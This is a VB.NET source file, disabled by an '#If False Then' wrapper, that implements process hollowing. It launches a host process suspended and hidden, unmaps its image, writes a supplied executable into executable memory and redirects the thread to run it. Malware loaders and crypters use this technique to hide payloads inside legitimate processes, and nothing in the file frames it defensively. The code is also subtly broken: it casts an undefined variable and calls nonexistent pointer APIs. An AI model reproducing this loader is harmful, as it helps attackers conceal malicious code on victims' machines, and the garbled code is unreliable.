#If False Then
Imports System.Runtime.InteropServices
Imports System
Imports System.Reflection

Public NotInheritable Class CMemoryExecute
    Public Shared Function Run(exeBuffer As Byte(), hostProcess As String, Optional optionalArguments As String = "") As Boolean
        ' STARTUPINFO
        Dim StartupInfo As New STARTUPINFO()
        StartupInfo.dwFlags = STARTF_USESTDHANDLES Or STARTF_USESHOWWINDOW
        StartupInfo.wShowWindow = SW_HIDE

        Dim IMAGE_SECTION_HEADER = New Byte(39) {}
        ' pish
        Dim IMAGE_NT_HEADERS = New Byte(247) {}
        ' pinh
        Dim IMAGE_DOS_HEADER = New Byte(63) {}
        ' pidh
        Dim PROCESS_INFO = New Integer(3) {}
        ' pi
        Dim CONTEXT = New Byte(715) {}
        ' ctx
        Dim pish = CType(p, Pointer)
        Dim pinh = CType(p, Pointer)
        Dim pidh = CType(p, Pointer)
        Dim ctx = CType(p, Pointer)

        ' Set the flag.
        ' ContextFlags 
        CType(ctx + &H0, Pointer).Target = CONTEXT_FULL

        ' Get the DOS header of the EXE.
        Buffer.BlockCopy(exeBuffer, 0, IMAGE_DOS_HEADER, 0, IMAGE_DOS_HEADER.Length)

        ' Sanity check:  See if we have MZ header. 

        ' e_magic 
        If CType(pidh + &H0, Pointer(Of UShort)).Target <> IMAGE_DOS_SIGNATURE Then
            Return False
        End If

        Dim e_lfanew = CType(pidh + &H3C, Pointer(Of Integer)).Target

        ' Get the NT header of the EXE.
        Buffer.BlockCopy(exeBuffer, e_lfanew, IMAGE_NT_HEADERS, 0, IMAGE_NT_HEADERS.Length)

        ' Sanity check: See if we have PE00 header. 

        ' Signature 
        If CType(pinh + &H0, Pointer(Of UInteger)).Target <> IMAGE_NT_SIGNATURE Then
            Return False
        End If

        ' Run with parameters if necessary.
        If Not String.IsNullOrEmpty(optionalArguments) Then
            hostProcess += Convert.ToString(" ") & optionalArguments
        End If

        If Not CreateProcess(Nothing, hostProcess, IntPtr.Zero, IntPtr.Zero, False, CREATE_SUSPENDED, _
            IntPtr.Zero, Nothing, StartupInfo, PROCESS_INFO) Then
            Return False
        End If

        Dim ImageBase = New IntPtr(CType(pinh + &H34, Pointer(Of Integer)).Target)
        ' pi.hProcess 
        NtUnmapViewOfSection(DirectCast(PROCESS_INFO(0), IntPtr), ImageBase)
        ' pi.hProcess 
        ' SizeOfImage 
        If VirtualAllocEx(DirectCast(PROCESS_INFO(0), IntPtr), ImageBase, CType(pinh + &H50, Pointer(Of UInteger)).Target, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE) = IntPtr.Zero Then
            Run(exeBuffer, hostProcess, optionalArguments)
        End If
        ' Memory allocation failed; try again (this can happen in low memory situations)
        ' pi.hProcess 
        ' SizeOfHeaders 
        NtWriteVirtualMemory(DirectCast(PROCESS_INFO(0), IntPtr), ImageBase, DirectCast(p, IntPtr), CType(pinh + 84, Pointer(Of UInteger)).Target, IntPtr.Zero)

        For i As UShort = 0 To CType(pinh + &H6, Pointer(Of UShort)).Target - 1
            ' NumberOfSections 
            Buffer.BlockCopy(exeBuffer, e_lfanew + IMAGE_NT_HEADERS.Length + (IMAGE_SECTION_HEADER.Length * i), IMAGE_SECTION_HEADER, 0, IMAGE_SECTION_HEADER.Length)
            ' PointerToRawData 
            ' pi.hProcess 
            ' VirtualAddress 
            ' SizeOfRawData 
            NtWriteVirtualMemory(DirectCast(PROCESS_INFO(0), IntPtr), DirectCast(CInt(ImageBase) + CType(pish + &HC, Pointer(Of UInteger)).Target, IntPtr), DirectCast(p, IntPtr), CType(pish + &H10, Pointer(Of UInteger)).Target, IntPtr.Zero)
        Next

        ' pi.hThread 
        NtGetContextThread(DirectCast(PROCESS_INFO(1), IntPtr), DirectCast(ctx, IntPtr))
        ' pi.hProcess 
        ' ecx 
        NtWriteVirtualMemory(DirectCast(PROCESS_INFO(0), IntPtr), DirectCast(CType(ctx + &HAC, Pointer(Of UInteger)).Target, IntPtr), ImageBase, &H4, IntPtr.Zero)
        ' eax 
        ' AddressOfEntryPoint 
        CType(ctx + &HB0, Pointer(Of UInteger)).Target = CUInt(ImageBase) + CType(pinh + &H28, Pointer(Of UInteger)).Target
        ' pi.hThread 
        NtSetContextThread(DirectCast(PROCESS_INFO(1), IntPtr), DirectCast(ctx, IntPtr))
        ' pi.hThread 
        NtResumeThread(DirectCast(PROCESS_INFO(1), IntPtr), IntPtr.Zero)


        Return True
    End Function


End Class
Module CME

    Structure STARTUPINFO
        Public cb As UInteger
        Public lpReserved As String
        Public lpDesktop As String
        Public lpTitle As String
        Public dwX As UInteger
        Public dwY As UInteger
        Public dwXSize As UInteger
        Public dwYSize As UInteger
        Public dwXCountChars As UInteger
        Public dwYCountChars As UInteger
        Public dwFillAttribute As UInteger
        Public dwFlags As UInteger
        Public wShowWindow As Short
        Public cbReserved2 As Short
        Public lpReserved2 As IntPtr
        Public hStdInput As IntPtr
        Public hStdOutput As IntPtr
        Public hStdError As IntPtr
    End Structure

    Friend Const CONTEXT_FULL As UInteger = &H10007
    Friend Const CREATE_SUSPENDED As Integer = &H4
    Friend Const MEM_COMMIT As Integer = &H1000
    Friend Const MEM_RESERVE As Integer = &H2000
    Friend Const PAGE_EXECUTE_READWRITE As Integer = &H40
    Friend Const IMAGE_DOS_SIGNATURE As UShort = &H5A4D     ' MZ
    Friend Const IMAGE_NT_SIGNATURE As UInteger = &H4550    ' PE00
    Friend Const SW_SHOW As Short = 5
    Friend Const SW_HIDE As Short = 0
    Friend Const STARTF_USESTDHANDLES As UInteger = &H100
    Friend Const STARTF_USESHOWWINDOW As UInteger = &H1

    <DllImport("kernel32.dll", SetLastError:=True)> Function CreateProcess(lpApplicationName As String, lpCommandLine As String, lpProcessAttributes As IntPtr, lpThreadAttributes As IntPtr, bInheritHandles As Boolean, dwCreationFlags As UInteger, _
        lpEnvironment As IntPtr, lpCurrentDirectory As String, ByRef lpStartupInfo As STARTUPINFO, lpProcessInfo As Integer()) As Boolean
    End Function
    <DllImport("kernel32.dll", SetLastError:=True)> Function VirtualAllocEx(hProcess As IntPtr, lpAddress As IntPtr, dwSize As UInteger, flAllocationType As UInteger, flProtect As UInteger) As IntPtr
    End Function
    <DllImport("ntdll.dll", SetLastError:=True)> Function NtUnmapViewOfSection(hProcess As IntPtr, lpBaseAddress As IntPtr) As UInteger
    End Function
    <DllImport("ntdll.dll", SetLastError:=True)> Function NtWriteVirtualMemory(hProcess As IntPtr, lpBaseAddress As IntPtr, lpBuffer As IntPtr, nSize As UInteger, lpNumberOfBytesWritten As IntPtr) As Integer
    End Function
    <DllImport("ntdll.dll", SetLastError:=True)> Function NtGetContextThread(hThread As IntPtr, lpContext As IntPtr) As Integer
    End Function
    <DllImport("ntdll.dll", SetLastError:=True)> Function NtSetContextThread(hThread As IntPtr, lpContext As IntPtr) As Integer
    End Function
    <DllImport("ntdll.dll", SetLastError:=True)> Function NtResumeThread(hThread As IntPtr, SuspendCount As IntPtr) As UInteger
    End Function

End Module
#End If